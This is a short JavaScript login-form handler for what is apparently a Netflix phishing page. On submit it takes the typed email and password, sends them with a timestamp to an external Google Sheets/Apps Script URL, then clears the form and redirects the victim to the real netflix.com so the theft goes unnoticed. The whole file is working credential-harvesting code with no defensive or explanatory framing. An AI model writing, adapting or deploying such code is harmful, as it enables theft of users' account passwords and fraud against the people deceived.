document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // Replace this URL with your Google Apps Script Web App URL
    const scriptURL = 'https://docs.google.com/spreadsheets/d/1FIQQVr8RduGXzLoSR8SvGGWIG04ypuJXmLHucIjH1XY/edit?gid=0#gid=0';
    
    fetch(scriptURL, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            email: email,
            password: password,
            timestamp: new Date().toISOString()
        })
    })
    .then(response => {
        // Clear the form
        document.getElementById('loginForm').reset();
        // You can redirect to Netflix or show an error message
        window.location.href = 'https://www.netflix.com';
    })
    .catch(error => {
        console.error('Error:', error);
    });
});